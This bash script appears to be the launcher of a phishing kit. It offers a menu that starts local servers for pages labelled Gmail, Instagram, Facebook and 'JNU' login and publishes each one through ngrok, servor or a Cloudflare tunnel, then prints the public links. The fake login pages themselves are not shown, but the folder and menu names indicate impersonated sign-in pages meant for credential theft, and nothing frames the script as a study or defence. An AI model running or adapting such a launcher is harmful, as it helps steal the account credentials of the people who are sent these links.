#!/bin/bash

clear
#echo "======================================="
#echo "         Tool Manager akash singh   "
#echo "======================================="
#echo ""

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

declare -A SERVER_PIDS
declare -A TUNNEL_PIDS
declare -A TUNNEL_URLS

declare -a tools=("jnu" "gmail" "insta" "facebook" "instalogin")
declare -a ports=(5051 5050 5052 5053 5054)
declare -a names=("JNU Login" "Gmail Login" "Insta Login" "facebook" "instalogin")

is_running() {
    ps -p $1 > /dev/null 2>&1
    return $?
}

start_tool() {
    folder="$BASE_DIR/$1"
    port=$2
    name=$3
    tunnel_choice=$4

    echo "[*] Starting $name on port $port..."

    ( cd "$folder" && python3 server.py ) &
    SERVER_PID=$!
    sleep 2

    public_url=""
    unset TUNNEL_PID

    case "$tunnel_choice" in
        a)
            echo "[*] Starting Ngrok..."
            ngrok http $port > /dev/null &
            TUNNEL_PID=$!
            sleep 5
            public_url=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -oP '"public_url":"\K[^"]+')
            ;;
        b)
            echo "[*] Starting Servio.net..."
            npx servor "$folder" --port=$port --browse=false > "$folder/servio.log" 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            public_url="http://$(hostname -I | awk '{print $1}'):$port"
            ;;
        c)
            echo "[*] Starting Cloudflared..."
            stdbuf -oL cloudflared tunnel --url http://localhost:$port > "$folder/cloudflared.log" 2>&1 &
            TUNNEL_PID=$!
            echo "[*] Waiting for Cloudflared to initialize..."
            for i in {1..10}; do
                sleep 1
                public_url=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$folder/cloudflared.log" | head -1)
                [ -n "$public_url" ] && break
            done
            ;;
        *)
            echo "[!] Invalid option, tunnel not started."
            ;;
    esac

    echo ""
    echo "[+] $name started"
    echo "[+] Public URL: $public_url"
    echo ""

    tool_key=$(basename "$folder")
    SERVER_PIDS["$tool_key"]=$SERVER_PID
    TUNNEL_PIDS["$tool_key"]=$TUNNEL_PID
    TUNNEL_URLS["$tool_key"]=$public_url
}

stop_tool() {
    folder="$1"
    name="$2"

    server_pid=${SERVER_PIDS[$folder]}
    tunnel_pid=${TUNNEL_PIDS[$folder]}

    echo "[*] Stopping $name..."

    if [ -n "$server_pid" ]; then
        if is_running "$server_pid"; then
            kill "$server_pid"
            echo " - Server process $server_pid killed."
        else
            echo " - Server process $server_pid not running."
        fi
    fi

    if [ -n "$tunnel_pid" ]; then
        if is_running "$tunnel_pid"; then
            kill "$tunnel_pid"
            echo " - Tunnel process $tunnel_pid killed."
        else
            echo " - Tunnel process $tunnel_pid not running."
        fi
    fi

    unset SERVER_PIDS["$folder"]
    unset TUNNEL_PIDS["$folder"]
    unset TUNNEL_URLS["$folder"]

    echo "[*] $name stopped."
    echo ""
}

trap 'echo -e "\n[!] Exiting... Stopping all running tools."; for key in "${!SERVER_PIDS[@]}"; do stop_tool "$key" "$key"; done; exit 0' SIGINT SIGTERM

while true; do
    echo ""
    echo "Running tools:"
    if [ ${#SERVER_PIDS[@]} -eq 0 ]; then
        echo "No tools running."
    else
        for key in "${!SERVER_PIDS[@]}"; do
            echo "- $key : ${TUNNEL_URLS[$key]}"
        done
    fi

    echo ""
    echo "Available tools to run:"
    for i in "${!tools[@]}"; do
        folder="${tools[$i]}"
        if [ -z "${SERVER_PIDS[$folder]}" ]; then
            echo "$((i+1)). ${names[$i]}"
        fi
    done

    echo ""
    echo "Options:"
    echo "a. Start all available tools"
    echo "z. Stop all running tools"
    echo "r. Show running tools"
    echo "x. Stop a running tool"
    echo "q. Quit"
    echo ""

    read -p "Select an option: " choice

    if [[ "$choice" == "q" ]]; then
        echo "Exiting and stopping all tools..."
        for key in "${!SERVER_PIDS[@]}"; do
            stop_tool "$key" "$key"
        done
        break

    elif [[ "$choice" == "a" ]]; then
        echo "Choose tunnel method for all tools:"
        echo "a. Ngrok"
        echo "b. Servio.net"
        echo "c. Cloudflared"
        read -p "Enter option (a-c): " tunnel_choice
        echo ""

        for i in "${!tools[@]}"; do
            folder="${tools[$i]}"
            name="${names[$i]}"
            port="${ports[$i]}"
            if [ -z "${SERVER_PIDS[$folder]}" ]; then
                start_tool "$folder" "$port" "$name" "$tunnel_choice"
            fi
        done

    elif [[ "$choice" == "z" ]]; then
        echo "Stopping all running tools..."
        for key in "${!SERVER_PIDS[@]}"; do
            stop_tool "$key" "$key"
        done

    elif [[ "$choice" == "r" ]]; then
        echo ""
        echo "Currently running tools:"
        if [ ${#SERVER_PIDS[@]} -eq 0 ]; then
            echo "No tools running."
        else
            index=1
            for key in "${!SERVER_PIDS[@]}"; do
                echo "$index. $key : ${TUNNEL_URLS[$key]}"
                ((index++))
            done
        fi
        echo ""

    elif [[ "$choice" == "x" ]]; then
        if [ ${#SERVER_PIDS[@]} -eq 0 ]; then
            echo "No running tools to stop."
            continue
        fi

        echo ""
        echo "Running tools:"
        index=1
        declare -a running_keys=()
        for key in "${!SERVER_PIDS[@]}"; do
            echo "$index. $key"
            running_keys+=("$key")
            ((index++))
        done

        read -p "Enter number of tool to stop: " stop_choice

        if [[ "$stop_choice" =~ ^[0-9]+$ && $stop_choice -le ${#running_keys[@]} && $stop_choice -gt 0 ]]; then
            folder="${running_keys[$((stop_choice-1))]}"
            stop_tool "$folder" "$folder"
        else
            echo "Invalid selection."
        fi
        echo ""

    elif [[ "$choice" =~ ^[1-9]+$ && $choice -le ${#tools[@]} ]]; then
        index=$((choice-1))
        folder="${tools[$index]}"
        name="${names[$index]}"
        port="${ports[$index]}"

        if [ -n "${SERVER_PIDS[$folder]}" ]; then
            echo "[!] $name is already running."
        else
            echo ""
            read -p "You selected '$name'. Do you want to proceed? (Y/n): " confirm
            confirm=${confirm:-Y}

            if [[ "$confirm" =~ ^[Yy]$ ]]; then
                echo "Choose tunnel method for $name:"
                echo "a. Ngrok"
                echo "b. Servio.net"
                echo "c. Cloudflared"
                read -p "Enter option (a-c): " tunnel_choice
                start_tool "$folder" "$port" "$name" "$tunnel_choice"
            else
                echo "[*] Returning to main menu..."
            fi
        fi

    else
        echo "Invalid choice."
    fi
done

